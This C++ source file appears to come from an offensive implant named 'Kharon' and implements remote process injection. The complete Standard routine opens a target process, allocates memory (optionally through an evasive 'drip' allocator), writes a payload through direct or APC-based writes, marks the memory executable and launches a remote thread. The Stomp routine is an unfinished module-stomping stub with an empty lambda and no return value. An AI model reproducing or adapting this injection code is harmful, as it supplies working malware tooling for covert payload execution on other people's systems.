#include <Kharon.h>

auto DECLFN Injection::Standard(
    _In_    BYTE*    Buffer,
    _In_    SIZE_T   Size,
    _In_    BYTE*    ArgBuff,
    _In_    SIZE_T   ArgSize,
    _In_    CHAR*    TaskUUID,
    _Inout_ INJ_OBJ* Object
) -> BOOL {
    CHAR* DefUUID = TaskUUID;

    PVOID  BaseAddress = nullptr;
    PVOID  TempAddress = nullptr;
    PVOID  Destiny     = nullptr;
    PVOID  Source      = nullptr;
    ULONG  OldProt     = 0;
    PVOID  Parameter   = nullptr;
    HANDLE ThreadHandle= INVALID_HANDLE_VALUE;
    ULONG  ThreadId    = 0;
    SIZE_T FullSize    = ArgSize + Size;
    HANDLE PsHandle    = INVALID_HANDLE_VALUE;
    ULONG  PsOpenFlags = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;

    KhDbg("[DEBUG] Injection::Standard called, FullSize=%llu, Size=%llu, ArgSize=%llu, PID=%lu\n",
           FullSize, Size, ArgSize, Object->ProcessId);

    if ( ! Object->PsHandle ) {
        PsHandle = Self->Ps->Open( PsOpenFlags, FALSE, Object->ProcessId );
        KhDbg("[DEBUG] Opened process handle: %p\n", PsHandle);
        if ( PsHandle == INVALID_HANDLE_VALUE ) {
            KhDbg("[ERROR] Failed to open process %lu\n", Object->ProcessId);
            return FALSE;
        }
    } else {
        PsHandle = Object->PsHandle;
        KhDbg("[DEBUG] Using existing process handle: %p\n", PsHandle);
    }

    TempAddress = Self->Mm->Alloc( nullptr, FullSize, MEM_COMMIT, PAGE_READWRITE );
    KhDbg("[DEBUG] Allocated TempAddress: %p (local)\n", TempAddress);
    if ( ! TempAddress ) {
        if ( PsHandle && ! Object->PsHandle ) Self->Ntdll.NtClose( PsHandle );
        KhDbg("[ERROR] Failed to allocate TempAddress\n");
        return FALSE;
    }

    auto MemAlloc = [&]( SIZE_T AllocSize ) -> PVOID {
        PVOID addr = nullptr;
        if ( Self->Inj->Ctx.Alloc == 0 ) {
            addr = Self->Mm->Alloc( nullptr, AllocSize, MEM_COMMIT, PAGE_READWRITE, PsHandle );
            KhDbg("[DEBUG] Mm::Alloc remote: %p (size=%llu)\n", addr, AllocSize);
        } else {
            addr = Self->Mm->DripAlloc( AllocSize, PAGE_READWRITE, PsHandle );
            KhDbg("[DEBUG] DripAlloc remote: %p (size=%llu)\n", addr, AllocSize);
        }
        return addr;
    };

    auto MemWrite = [&]( PVOID Dst, PVOID Src, SIZE_T CopySize ) -> BOOL {
        BOOL result = FALSE;
        KhDbg("[DEBUG] Writing %llu bytes to %p\n", CopySize, Dst);
        if ( PsHandle == NtCurrentProcess() ) {
             if ( (BOOL)Mem::Copy( Dst, Src, CopySize ) ) result = TRUE;
             KhDbg("[DEBUG] Local Mem::Copy result=%d\n", result);
             return result;
        } else if (Self->Inj->Ctx.Write == 0) {
            result = (BOOL)Self->Mm->Write( Dst, (BYTE*)Src, CopySize, 0, PsHandle );
            KhDbg("[DEBUG] Remote Write result=%d\n", result);
        } else {
            result = (BOOL)Self->Mm->WriteAPC( PsHandle, Dst, (BYTE*)Src, CopySize );
            KhDbg("[DEBUG] Remote WriteAPC result=%d\n", result);
        }
        return result;
    };

    auto Cleanup = [&]( BOOL BooleanRet = FALSE, SIZE_T MemSizeToZero = 0 ) -> BOOL {
        SIZE_T DefaultSize = FullSize;

        if ( ! MemSizeToZero ) MemSizeToZero = DefaultSize;

        KhDbg("[DEBUG] Cleanup called, success=%d, BaseAddress=%p, TempAddress=%p\n",
               BooleanRet, BaseAddress, TempAddress);

        if ( BooleanRet && Object->Persist ) {
            Object->BaseAddress  = BaseAddress;
            Object->ThreadHandle = ThreadHandle;
            Object->ThreadId     = ThreadId;
            KhDbg("[DEBUG] Persisting object: Base=%p, ThreadId=%lu\n", BaseAddress, ThreadId);
        } else {
            if ( BaseAddress ) {
                Self->Mm->Free( BaseAddress, MemSizeToZero, MEM_RELEASE, PsHandle );
                KhDbg("[DEBUG] Freed remote BaseAddress %p\n", BaseAddress);
            }
            if ( PsHandle && ! Object->PsHandle ) {
                Self->Ntdll.NtClose( PsHandle );
                KhDbg("[DEBUG] Closed process handle %p\n", PsHandle);
            }
        }
        if ( TempAddress ) {
            Self->Mm->Free( TempAddress, FullSize, MEM_RELEASE );
            KhDbg("[DEBUG] Freed TempAddress %p\n", TempAddress);
        }
        
        return BooleanRet;
    };

    BaseAddress = MemAlloc( FullSize );
    if ( ! BaseAddress ) {
        KhDbg("[WARN] First MemAlloc failed, retrying...\n");
        BaseAddress = MemAlloc( FullSize );
        if ( ! BaseAddress ) {
            KhDbg("[ERROR] Second MemAlloc failed\n");
            return Cleanup();
        }
    }
    KhDbg("[DEBUG] Allocated remote BaseAddress: %p\n", BaseAddress);
    
    Mem::Copy( (BYTE*)TempAddress, Buffer, Size );
    KhDbg("[DEBUG] Copied payload buffer to TempAddress\n");

    if ( ArgSize > 0 ) {
        Mem::Copy( (BYTE*)TempAddress + Size, ArgBuff, ArgSize );
        Parameter = (BYTE*)BaseAddress + Size;
        KhDbg("[DEBUG] Copied ArgBuff (size=%llu), Parameter=%p\n", ArgSize, Parameter);
    }
    
    if ( ! MemWrite( BaseAddress, TempAddress, FullSize ) ) {
        KhDbg("[ERROR] Failed MemWrite to remote process\n");
        return Cleanup();
    }

    if ( ! Self->Mm->Protect( BaseAddress, FullSize, PAGE_EXECUTE_READ, &OldProt, PsHandle ) ) {
        KhDbg("[ERROR] Failed to change protection on BaseAddress %p\n", BaseAddress);
        return Cleanup();
    }
    KhDbg("[DEBUG] Changed protection on BaseAddress %p to PAGE_EXECUTE_READ\n", BaseAddress);

    ThreadHandle = Self->Td->Create( PsHandle, (BYTE*)BaseAddress, Parameter, 0, 0, &ThreadId );
    if ( ThreadHandle == INVALID_HANDLE_VALUE ) {
        KhDbg("[ERROR] Failed to create remote thread\n");
        return Cleanup();
    }
    KhDbg("[DEBUG] Created remote thread %lu (handle=%p)\n", ThreadId, ThreadHandle);

    return Cleanup( TRUE );
}

auto DECLFN Injection::Stomp(
    _In_    BYTE*    Buffer,
    _In_    SIZE_T   Size,
    _In_    BYTE*    ArgBuff,
    _In_    SIZE_T   ArgSize,
    _In_    CHAR*    TaskUUID,
    _Inout_ INJ_OBJ* Object
) -> BOOL {
    HANDLE FileHandle = INVALID_HANDLE_VALUE;
    HANDLE PsHandle   = INVALID_HANDLE_VALUE;

    ULONG  PsOpenFlags = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;

    if ( ! Object->PsHandle ) {
        PsHandle = Self->Ps->Open( PsOpenFlags, FALSE, Object->ProcessId );
        if ( PsHandle == INVALID_HANDLE_VALUE ) {
            return FALSE;
        }
    } else {
        PsHandle = Object->PsHandle;
    }

    auto GetTargetDll = [&]( BOOL IsRnd ) -> CHAR* {
        CHAR* DllName = nullptr;

        if ( IsRnd ) {
            
        }
    };

    auto MemWrite = [&]( PVOID Dst, PVOID Src, SIZE_T CopySize ) -> BOOL {
        BOOL result = FALSE;
        if ( PsHandle == NtCurrentProcess() ) {
             if ( (BOOL)Mem::Copy( Dst, Src, CopySize ) ) result = TRUE;
             return result;
        } else if (Self->Inj->Ctx.Write == 0) {
            result = (BOOL)Self->Mm->Write( Dst, (BYTE*)Src, CopySize, 0, PsHandle );
        } else {
            result = (BOOL)Self->Mm->WriteAPC( PsHandle, Dst, (BYTE*)Src, CopySize );
        }
        return result;
    };
}   